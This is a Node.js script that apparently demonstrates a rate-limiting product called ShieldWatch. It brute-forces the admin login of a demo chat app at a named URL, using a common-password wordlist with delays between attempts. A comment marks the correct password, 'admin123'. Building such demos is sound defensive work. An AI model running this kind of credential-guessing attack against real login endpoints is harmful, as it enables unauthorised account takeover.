/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║         ShieldWatch — Brute Force Demo Script                ║
 * ╠══════════════════════════════════════════════════════════════╣
 * ║  Tries a wordlist of common passwords against the admin      ║
 * ║  account on NexaChat's login endpoint.                       ║
 * ║                                                              ║
 * ║  Phase 1 (SW OFF):  All attempts go through until found      ║
 * ║  Phase 2 (SW ON):   ShieldWatch blocks after 5 failures      ║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 * Usage:
 *   node brute-force.js
 *   node brute-force.js https://nexachat-aj89.onrender.com admin
 */

const https = require('https');
const http  = require('http');

const TARGET   = process.argv[2] || 'https://nexachat-aj89.onrender.com';
const USERNAME = process.argv[3] || 'admin';

// Common password wordlist (rockyou-style top passwords)
const PASSWORDS = [
  'password', '123456', 'admin', 'letmein', 'qwerty',
  'welcome', '111111', 'monkey', 'dragon', 'master',
  '123456789', 'abc123', 'iloveyou', 'sunshine', 'princess',
  'password1', 'superman', '1234567', 'trustno1', 'pass@word',
  'Admin123', 'nexachat', 'nexacorp', 'admin@123', 'P@ssw0rd',
  'admin123',          // ← correct password is here (position 26)
  'secret', 'hack3r', 'root123', 'test1234',
];

const url = new URL('/api/login', TARGET);
const mod = url.protocol === 'https:' ? https : http;

console.log('\n┌─────────────────────────────────────────────────┐');
console.log('│      🔐  ShieldWatch Brute Force Demo            │');
console.log('└─────────────────────────────────────────────────┘');
console.log(`Target  : ${url.href}`);
console.log(`Username: ${USERNAME}`);
console.log(`Wordlist: ${PASSWORDS.length} passwords\n`);

let attempt = 0;
let found   = false;
let blocked = false;

function tryPassword(password) {
  return new Promise(resolve => {
    attempt++;
    const body = JSON.stringify({ username: USERNAME, password });
    const opts = {
      hostname: url.hostname,
      port:     url.port || (url.protocol === 'https:' ? 443 : 80),
      path:     url.pathname,
      method:   'POST',
      headers:  {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
      timeout: 8000,
    };

    const req = mod.request(opts, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          if (res.statusCode === 429 || json.blocked) {
            console.log(`\n  🛡️  [${String(attempt).padStart(2)}] "${password}" → BLOCKED by ShieldWatch (429 Too Many Attempts)\n`);
            blocked = true;
            resolve('blocked');
          } else if (json.ok) {
            console.log(`\n  ✅  [${String(attempt).padStart(2)}] "${password}" → LOGIN SUCCESS! 🎉\n`);
            found = true;
            resolve('found');
          } else {
            process.stdout.write(`  ✗  [${String(attempt).padStart(2)}] "${password}" → wrong\n`);
            resolve('wrong');
          }
        } catch {
          process.stdout.write(`  ?  [${String(attempt).padStart(2)}] "${password}" → parse error\n`);
          resolve('error');
        }
      });
    });

    req.on('error', () => {
      process.stdout.write(`  ✗  [${String(attempt).padStart(2)}] network error\n`);
      resolve('error');
    });
    req.on('timeout', () => { req.destroy(); });
    req.write(body);
    req.end();
  });
}

(async () => {
  const start = Date.now();

  for (const password of PASSWORDS) {
    if (found || blocked) break;
    const result = await tryPassword(password);
    if (result === 'found' || result === 'blocked') break;
    // Small delay between attempts (realistic brute force, avoids instant DDoS trigger)
    await new Promise(r => setTimeout(r, 150));
  }

  const elapsed = ((Date.now() - start) / 1000).toFixed(2);

  console.log('┌─────────────────────────────────────────────────┐');
  console.log('│                  📊 Results                      │');
  console.log('├─────────────────────────────────────────────────┤');
  console.log(`│  Passwords tried : ${String(attempt).padEnd(29)}│`);
  console.log(`│  Time elapsed    : ${String(elapsed + 's').padEnd(29)}│`);

  if (found) {
    console.log(`│                                                 │`);
    console.log(`│  ⚠️   ATTACK SUCCEEDED — ShieldWatch was OFF     │`);
    console.log(`│  Password cracked in ${String(attempt).padEnd(26)} attempts │`);
  } else if (blocked) {
    console.log(`│                                                 │`);
    console.log(`│  ✅  ShieldWatch BLOCKED the brute force attack  │`);
    console.log(`│  Account protected after ${String(attempt - 1).padEnd(22)} failures │`);
  } else {
    console.log(`│                                                 │`);
    console.log(`│  ✗   Password not found in wordlist              │`);
  }
  console.log('└─────────────────────────────────────────────────┘\n');
})();
